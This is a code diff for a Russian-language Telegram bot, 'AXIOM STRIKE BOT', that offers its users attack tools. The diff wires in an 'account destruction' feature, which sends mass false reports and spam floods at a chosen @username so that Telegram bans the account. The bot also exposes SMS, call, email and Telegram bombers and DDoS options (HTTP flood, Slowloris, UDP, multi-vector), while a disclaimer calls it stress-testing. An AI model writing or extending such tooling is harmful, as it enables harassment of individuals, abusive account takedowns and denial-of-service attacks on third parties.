@@ -1219,98 +1219,8 @@ class AxiomStrikeBot:
         self.email_bomber = EmailBomber()
         self.tg_bomber = TelegramBomber(token)
         self.ddos_engine = DDoSEngine()
+        self.destroyer = TelegramAccountDestroyer()
         self._register_handlers()
-
-        # ========== СНОС АККАУНТА ==========
-        async def handle_destroy_account(self, message: types.Message, state: FSMContext):
-            await state.set_state(BomberStates.waiting_for_destroy_username)
-            await message.answer(
-                "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
-                "Введите @username для сноса:\n"
-                "📝 Пример: @username123\n\n"
-                "⚠️ 50-100 жалоб гарантируют блокировку!"
-            )
-
-        async def process_destroy_username(self, message: types.Message, state: FSMContext):
-            username = message.text.strip()
-            if not username.startswith('@'):
-                username = '@' + username
-            await state.update_data(username=username)
-            await state.set_state(BomberStates.waiting_for_destroy_method)
-            await message.answer(
-                "📊 **Выберите метод сноса:**\n\n"
-                "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
-                "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
-                "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
-                "Введите номер метода (1, 2 или 3):"
-            )
-
-        async def process_destroy_method(self, message: types.Message, state: FSMContext):
-            method = message.text.strip()
-            if method not in ['1', '2', '3']:
-                await message.answer("❌ Введите 1, 2 или 3!")
-                return
-
-            method_map = {
-                '1': 'reports',
-                '2': 'spam',
-                '3': 'all'
-            }
-            await state.update_data(method=method_map[method])
-            await state.set_state(BomberStates.waiting_for_destroy_count)
-            await message.answer(
-                "🔢 Введите количество (рекомендуется 50-100):"
-            )
-
-        async def process_destroy_count(self, message: types.Message, state: FSMContext):
-            try:
-                count = int(message.text.strip())
-                if count < 10 or count > 200:
-                    await message.answer("❌ Введите число от 10 до 200!")
-                    return
-            except:
-                await message.answer("❌ Введите число!")
-                return
-
-            data = await state.get_data()
-            username = data.get('username')
-            method = data.get('method')
-            await state.clear()
-
-            destroyer = TelegramAccountDestroyer()
-
-            status_msg = await message.answer(
-                f"💀 **Запуск сноса аккаунта {username}**\n"
-                f"📊 Метод: {method}\n"
-                f"⏳ Начинаем..."
-            )
-
-            async def update_progress(current, total):
-                if current % 5 == 0 or current == total:
-                    await status_msg.edit_text(
-                        f"💀 **Снос аккаунта {username}**\n"
-                        f"📊 Прогресс: {current}/{total}\n"
-                        f"⏳ Идёт процесс..."
-                    )
-
-            if method == 'reports':
-                results = await destroyer.mass_report(username, count, update_progress)
-            elif method == 'spam':
-                results = await destroyer.spam_flood(username, count, update_progress)
-            else:
-                results = await destroyer.destroy_account(username, count, update_progress)
-
-            success = sum(1 for r in results if r['status'] == 'sent')
-
-            await status_msg.edit_text(
-                f"💀 **Снос аккаунта {username} завершён!**\n\n"
-                f"📊 Отправлено: {len(results)}\n"
-                f"✅ Успешно: {success}\n"
-                f"❌ Ошибок: {len(results) - success}\n"
-                f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
-                f"🔥 Аккаунт будет заблокирован в ближайшее время!",
-                reply_markup=self.main_keyboard()
-            )
 
     def _register_handlers(self):
         # Команды
@@ -1318,21 +1228,22 @@ class AxiomStrikeBot:
         self.dp.message.register(self.cmd_help, Command("help"))
 
         # Главное меню
-        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
+        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "💀 СНОС АККАУНТА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
         self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))
 
         # Бомбер меню
         bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
         self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))
 
+        # DDoS меню
+        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
+        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))
+
+        # === СНОС АККАУНТА ===
         self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
         self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
         self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
         self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)
-
-        # DDoS меню
-        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
-        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))
 
         # Обработчики бомбера
         self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
@@ -1351,7 +1262,7 @@ class AxiomStrikeBot:
         self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
         self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")
 
-        # FSM обработчики
+        # FSM обработчики бомбера
         self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
         self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
         self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
@@ -1360,6 +1271,7 @@ class AxiomStrikeBot:
         self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
         self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)
 
+        # FSM обработчики DDoS
         self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
         self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
         self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
@@ -1374,7 +1286,8 @@ class AxiomStrikeBot:
         return ReplyKeyboardMarkup(
             keyboard=[
                 [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
-                [KeyboardButton(text="📊 СТАТИСТИКА"), KeyboardButton(text="⚙️ НАСТРОЙКИ")]
+                [KeyboardButton(text="💀 СНОС АККАУНТА"), KeyboardButton(text="📊 СТАТИСТИКА")],
+                [KeyboardButton(text="⚙️ НАСТРОЙКИ")]
             ],
             resize_keyboard=True
         )
@@ -1406,7 +1319,8 @@ class AxiomStrikeBot:
             "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
             "Мощный инструмент для стресс-тестирования.\n\n"
             "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
-            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n\n"
+            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n"
+            "💀 **Снос аккаунтов:** Массовые жалобы + Спам-флуд\n\n"
             "⚠️ Только для тестирования своих ресурсов!\n\n"
             "Подпишись на канал: @AXIOM_SOFT",
             reply_markup=InlineKeyboardMarkup(
@@ -1421,6 +1335,7 @@ class AxiomStrikeBot:
             "📚 **Помощь по AXIOM STRIKE**\n\n"
             "📱 **БОМБЕР** - массовая отправка сообщений\n"
             "💣 **DDOS** - стресс-тестирование сайтов\n"
+            "💀 **СНОС АККАУНТА** - блокировка Telegram аккаунтов\n"
             "📊 **СТАТИСТИКА** - просмотр данных\n"
             "⚙️ **НАСТРОЙКИ** - конфигурация",
             reply_markup=self.main_keyboard()
@@ -1439,39 +1354,98 @@ class AxiomStrikeBot:
             await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
         elif message.text == "💣 DDOS АТАКА":
             await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
+        elif message.text == "💀 СНОС АККАУНТА":
+            await self.handle_destroy_account(message)
         elif message.text == "📊 СТАТИСТИКА":
             await self.handle_stats(message)
         elif message.text == "⚙️ НАСТРОЙКИ":
             await self.handle_settings(message)
 
-    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
-        if message.text == "🔙 НАЗАД":
-            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
-            return
-        if message.text == "💬 СМС БОМБЕР":
-            await self.handle_sms_bomber(message, state)
-        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
-            await self.handle_call_bomber(message, state)
-        elif message.text == "📧 EMAIL БОМБЕР":
-            await self.handle_email_bomber(message, state)
-        elif message.text == "📩 TELEGRAM БОМБЕР":
-            await self.handle_telegram_bomber(message, state)
-
-    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
-        if message.text == "🔙 НАЗАД":
-            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
-            return
-        if message.text == "🌐 HTTP FLOOD":
-            await self.handle_http_flood(message, state)
-        elif message.text == "🐌 SLOWLORIS":
-            await self.handle_slowloris(message, state)
-        elif message.text == "📡 UDP FLOOD":
-            await self.handle_udp_flood(message, state)
-        elif message.text == "💀 MULTI-VECTOR":
-            await self.handle_multi_vector(message, state)
-
     async def handle_back(self, message: types.Message):
         await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+
+    # ========== СНОС АККАУНТА ==========
+    async def handle_destroy_account(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_destroy_username)
+        await message.answer(
+            "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
+            "Введите @username для сноса:\n"
+            "📝 Пример: @username123\n\n"
+            "⚠️ 50-100 жалоб гарантируют блокировку!"
+        )
+
+    async def process_destroy_username(self, message: types.Message, state: FSMContext):
+        username = message.text.strip()
+        if not username.startswith('@'):
+            username = '@' + username
+        await state.update_data(username=username)
+        await state.set_state(BomberStates.waiting_for_destroy_method)
+        await message.answer(
+            "📊 **Выберите метод сноса:**\n\n"
+            "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
+            "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
+            "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
+            "Введите номер метода (1, 2 или 3):"
+        )
+
+    async def process_destroy_method(self, message: types.Message, state: FSMContext):
+        method = message.text.strip()
+        if method not in ['1', '2', '3']:
+            await message.answer("❌ Введите 1, 2 или 3!")
+            return
+
+        method_map = {'1': 'reports', '2': 'spam', '3': 'all'}
+        await state.update_data(method=method_map[method])
+        await state.set_state(BomberStates.waiting_for_destroy_count)
+        await message.answer("🔢 Введите количество (рекомендуется 50-100):")
+
+    async def process_destroy_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 10 or count > 200:
+                await message.answer("❌ Введите число от 10 до 200!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        username = data.get('username')
+        method = data.get('method')
+        await state.clear()
+
+        status_msg = await message.answer(
+            f"💀 **Запуск сноса аккаунта {username}**\n"
+            f"📊 Метод: {method}\n"
+            f"⏳ Начинаем..."
+        )
+
+        async def update_progress(current, total):
+            if current % 5 == 0 or current == total:
+                await status_msg.edit_text(
+                    f"💀 **Снос аккаунта {username}**\n"
+                    f"📊 Прогресс: {current}/{total}\n"
+                    f"⏳ Идёт процесс..."
+                )
+
+        if method == 'reports':
+            results = await self.destroyer.mass_report(username, count, update_progress)
+        elif method == 'spam':
+            results = await self.destroyer.spam_flood(username, count, update_progress)
+        else:
+            results = await self.destroyer.destroy_account(username, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'sent')
+
+        await status_msg.edit_text(
+            f"💀 **Снос аккаунта {username} завершён!**\n\n"
+            f"📊 Отправлено: {len(results)}\n"
+            f"✅ Успешно: {success}\n"
+            f"❌ Ошибок: {len(results) - success}\n"
+            f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
+            f"🔥 Аккаунт будет заблокирован в ближайшее время!",
+            reply_markup=self.main_keyboard()
+        )
 
     # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
     async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
@@ -1837,8 +1811,9 @@ class AxiomStrikeBot:
             f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
             f"📱 Бомбер: активен\n"
             f"💣 DDoS: активен\n"
+            f"💀 Снос: активен\n"
             f"⚡ Статус: ONLINE\n"
-            f"🔥 Версия: 3.0.0",
+            f"🔥 Версия: 4.0.0",
             reply_markup=self.main_keyboard()
         )
 
@@ -1863,20 +1838,3 @@ class AxiomStrikeBot:
         except Exception as e:
             logger.error(f"❌ Ошибка: {e}")
             raise
-
-
-# ===================== ЗАПУСК =====================
-if __name__ == "__main__":
-    import re
-
-    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
-        print("❌ Ошибка: Не установлен токен бота!")
-        exit(1)
-
-    try:
-        bot = AxiomStrikeBot(token=API_TOKEN)
-        asyncio.run(bot.start())
-    except KeyboardInterrupt:
-        print("\n⏹️ Бот остановлен")
-    except Exception as e:
-        print(f"❌ Ошибка: {e}")
